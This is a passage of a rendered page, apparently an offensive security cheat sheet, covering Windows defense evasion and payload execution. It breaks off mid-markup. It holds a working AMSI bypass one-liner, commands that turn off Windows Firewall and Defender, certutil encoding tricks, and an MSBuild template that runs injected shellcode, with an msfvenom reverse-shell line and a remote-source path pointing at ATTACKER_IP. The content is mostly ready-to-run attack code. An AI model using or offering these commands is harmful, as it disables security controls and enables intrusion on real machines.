class=\"anchor\" aria-label=\"Permalink: 4.3.4 Windows AMSI Bypass\" href=\"#434-windows-amsi-bypass\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which\nwill e.g. block malicious powershell scripts from running. If you get a warning\nsaying something like \"This script contains malicious content and has been blocked\nby your antivirus software\", then run this command to disable that blocker.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like \u0026quot;*iUtils\u0026quot;) {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like \u0026quot;*Context\u0026quot;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$a\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eRef\u003c/span\u003e].Assembly.GetTypes();\u003cspan class=\"pl-k\"\u003eforeach\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$b\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$a\u003c/span\u003e){\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$b\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e*iUtils\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e) {\u003cspan class=\"pl-smi\"\u003e$c\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$b\u003c/span\u003e}};\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$c\u003cspan class=\"pl-smi\"\u003e.GetFields\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eNonPublic,Static\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\u003cspan class=\"pl-k\"\u003eforeach\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e) {\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$e\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e*Context\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e) {\u003cspan class=\"pl-smi\"\u003e$f\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$e\u003c/span\u003e}};\u003cspan class=\"pl-smi\"\u003e$g\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$f\u003cspan class=\"pl-smi\"\u003e.GetValue\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e);[\u003cspan class=\"pl-k\"\u003eIntPtr\u003c/span\u003e]\u003cspan class=\"pl-smi\"\u003e$ptr\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$g\u003c/span\u003e;[\u003cspan class=\"pl-k\"\u003eInt32\u003c/span\u003e[]]\u003cspan class=\"pl-smi\"\u003e$buf\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);[\u003cspan class=\"pl-k\"\u003eSystem.Runtime.InteropServices.Marshal\u003c/span\u003e]::Copy(\u003cspan class=\"pl-smi\"\u003e$buf\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$ptr\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOther bypasses available through nishang's \u003ca href=\"https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1\"\u003eInvoke-AMSIBypass\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.5 Turn off Windows Firewall\u003c/h3\u003e\u003ca id=\"user-content-435-turn-off-windows-firewall\" class=\"anchor\" aria-label=\"Permalink: 4.3.5 Turn off Windows Firewall\" href=\"#435-turn-off-windows-firewall\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# must be done from administrator prompt\n# Disable Windows firewall on newer Windows:\nnetsh advfirewall set allprofiles state off\n\n# Disable Windows firewall on older Windows:\nnetsh firewall set opmode disable\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e must be done from administrator prompt\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Disable Windows firewall on newer Windows:\u003c/span\u003e\nnetsh advfirewall set allprofiles state off\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Disable Windows firewall on older Windows:\u003c/span\u003e\nnetsh firewall set opmode disable\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.6 Turn off Windows Defender\u003c/h3\u003e\u003ca id=\"user-content-436-turn-off-windows-defender\" class=\"anchor\" aria-label=\"Permalink: 4.3.6 Turn off Windows Defender\" href=\"#436-turn-off-windows-defender\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# must be running powershell as Administrator\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n# for completely removing Windows Defender (until next Windows update)\nUninstall-WindowsFeature -Name Windows-Defender\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e must be running powershell as Administrator\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eSet-MpPreference\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eDisableRealtimeMonitoring \u003cspan class=\"pl-c1\"\u003e$true\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for completely removing Windows Defender (until next Windows update)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eUninstall-WindowsFeature\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName Windows\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eDefender\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, you should be able to do it with services:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sc config WinDefend start= disabled\nsc stop WinDefend\n\n# to restart Defender\nsc config WinDefend start= auto\nsc start WinDefend\"\u003e\u003cpre\u003esc config WinDefend start\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e disabled\nsc stop WinDefend\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to restart Defender\u003c/span\u003e\nsc config WinDefend start\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e auto\nsc start WinDefend\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eI think you can even disable it with Registry keys:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t DWORD /d 1 /f\n\n# more granular controls\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableBehaviorMonitoring /t DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableOnAccessProtection /t DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableScanOnRealtimeEnable /t DWORD /d 1 /f\n\n# then reboot for changes to take effect\"\u003e\u003cpre\u003ereg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev DisableAntiSpyware \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e more granular controls\u003c/span\u003e\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eTime Protection \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev DisableBehaviorMonitoring \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eTime Protection \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev DisableOnAccessProtection \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eTime Protection \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev DisableScanOnRealtimeEnable \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then reboot for changes to take effect\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.7 Windows Encoding/Decoding with LOLBAS\u003c/h3\u003e\u003ca id=\"user-content-437-windows-encodingdecoding-with-lolbas\" class=\"anchor\" aria-label=\"Permalink: 4.3.7 Windows Encoding/Decoding with LOLBAS\" href=\"#437-windows-encodingdecoding-with-lolbas\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# base64 encode a file\ncertutil -encode inputFileName encodedOutputFileName\n# base64 decode a file\ncertutil -decode encodedInputFileName decodedOutputFileName\n# hex decode a file\ncertutil --decodehex encoded_hexadecimal_InputFileName\n# MD5 checksum\ncertutil -hashfile somefile.txt MD5\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e base64 encode a file\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eencode inputFileName encodedOutputFileName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e base64 decode a file\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edecode encodedInputFileName decodedOutputFileName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hex decode a file\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e--\u003c/span\u003edecodehex encoded_hexadecimal_InputFileName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e MD5 checksum\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ehashfile somefile.txt MD5\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.8 Execute Inline Tasks with MSBuild.exe\u003c/h3\u003e\u003ca id=\"user-content-438-execute-inline-tasks-with-msbuildexe\" class=\"anchor\" aria-label=\"Permalink: 4.3.8 Execute Inline Tasks with MSBuild.exe\" href=\"#438-execute-inline-tasks-with-msbuildexe\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMSBuild is built into Windows .NET framework, and it lets you execute arbitrary\nC#/.NET code inline. Modify the XML file below with your shellcode from\nmsfvenom's \"-f csharp\" format (or build a payload with Empire's\nwindows/launcher_xml stager, or write your own C# and host over SMB)\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo build:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# locate MSBuild executables\ndir /b /s C:\\msbuild.exe\n\n# execute 32-bit shellcode\nC:\\Windows\\Microsoft.NET\\assembly\\GAC_32\\MSBuild\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\MSBuild.exe  payload.xml\n\n# execute 64-bit shellcode\nC:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\MSBuild\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\MSBuild.exe  payload.xml\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e locate MSBuild executables\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es C:\\\u003cspan class=\"pl-c1\"\u003emsbuild.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute 32-bit shellcode\u003c/span\u003e\nC:\\Windows\\Microsoft.NET\\assembly\\GAC_32\\MSBuild\\v4.\u003cspan class=\"pl-c1\"\u003e0_4.0\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e0.\u003c/span\u003e0__b03f5f7f11d50a3a\\\u003cspan class=\"pl-c1\"\u003eMSBuild.exe\u003c/span\u003e  payload.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute 64-bit shellcode\u003c/span\u003e\nC:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\MSBuild\\v4.\u003cspan class=\"pl-c1\"\u003e0_4.0\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e0.\u003c/span\u003e0__b03f5f7f11d50a3a\\\u003cspan class=\"pl-c1\"\u003eMSBuild.exe\u003c/span\u003e  payload.xml\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere's the payload.xml template to inject your shellcode into (if not building\nwith Empire)\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit\n     shellcode, and build with 64-bit MSBuild.exe\n     Building Shellcode:\n     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs\n--\u0026gt;\n\u0026lt;Project ToolsVersion=\u0026quot;4.0\u0026quot; xmlns=\u0026quot;http://schemas.microsoft.com/developer/msbuild/2003\u0026quot;\u0026gt;\n  \u0026lt;!-- This inline task executes shellcode. --\u0026gt;\n  \u0026lt;!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj --\u0026gt;\n  \u0026lt;!-- Save This File And Execute The Above Command --\u0026gt;\n  \u0026lt;!-- Author: Casey Smith, Twitter: @subTee --\u0026gt;\n  \u0026lt;!-- License: BSD 3-Clause --\u0026gt;\n  \u0026lt;Target Name=\u0026quot;Hello\u0026quot;\u0026gt;\n    \u0026lt;ClassExample /\u0026gt;\n  \u0026lt;/Target\u0026gt;\n  \u0026lt;UsingTask\n    TaskName=\u0026quot;ClassExample\u0026quot;\n    TaskFactory=\u0026quot;CodeTaskFactory\u0026quot;\n    AssemblyFile=\u0026quot;C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\u0026quot; \u0026gt;\n    \u0026lt;Task\u0026gt;\n\n      \u0026lt;Code Type=\u0026quot;Class\u0026quot; Language=\u0026quot;cs\u0026quot;\u0026gt;\n      \u0026lt;!-- to host code remotely, instead use:\n      \u0026lt;Code Type=\u0026quot;Class\u0026quot; Language=\u0026quot;cs\u0026quot; Source=\u0026quot;\\\\ATTACKER_IP\\share\\source.cs\u0026quot;\u0026gt;\n      --\u0026gt;\n      \u0026lt;![CDATA[\n        using System;\n        using System.Runtime.InteropServices;\n        using Microsoft.Build.Framework;\n        using Microsoft.Build.Utilities;\n        public class ClassExample :  Task, ITask\n        {\n          private static UInt32 MEM_COMMIT = 0x1000;\n          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n          [DllImport(\u0026quot;kernel32\u0026quot;)]\n            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\n            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n          [DllImport(\u0026quot;kernel32\u0026quot;)]\n            private static extern IntPtr CreateThread(\n            UInt32 lpThreadAttributes,\n            UInt32 dwStackSize,\n            UInt32 lpStartAddress,\n            IntPtr param,\n            UInt32 dwCreationFlags,\n            ref UInt32 lpThreadId\n            );\n          [DllImport(\u0026quot;kernel32\u0026quot;)]\n            private static extern UInt32 WaitForSingleObject(\n            IntPtr hHandle,\n            UInt32 dwMilliseconds\n            );\n          public override bool Execute()\n          {\n            //PUT YOUR SHELLCODE HERE;\n\n            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);\n            IntPtr hThread = IntPtr.Zero;\n            UInt32 threadId = 0;\n            IntPtr pinfo = IntPtr.Zero;\n            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n            return true;\n          }\n        }\n      ]]\u0026gt;\n      \u0026lt;/Code\u0026gt;\n    \u0026lt;/Task\u0026gt;\n  \u0026lt;/UsingTask\u0026gt;\n\u0026lt;/Project\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e     shellcode, and build with 64-bit MSBuild.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e     Building Shellcode:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eProject\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eToolsVersion\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e4.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://schemas.microsoft.com/developer/msbuild/2003\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e This inline task executes shellcode. \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e Save This File And Execute The Above Command \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e Author: Casey Smith, Twitter: @subTee \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e License: BSD 3-Clause \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003eTarget\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eName\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHello\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003eClassExample\u003c/span\u003e /\u0026gt;\n  \u0026lt;/\u003cspan class=\"pl-ent\"\u003eTarget\u003c/span\u003e\u0026gt;\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003eUsingTask\u003c/span\u003e\n    \u003cspan class=\"pl-e\"\u003eTaskName\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eClassExample\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-e\"\u003eTaskFactory\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCodeTaskFactory\u003cspan 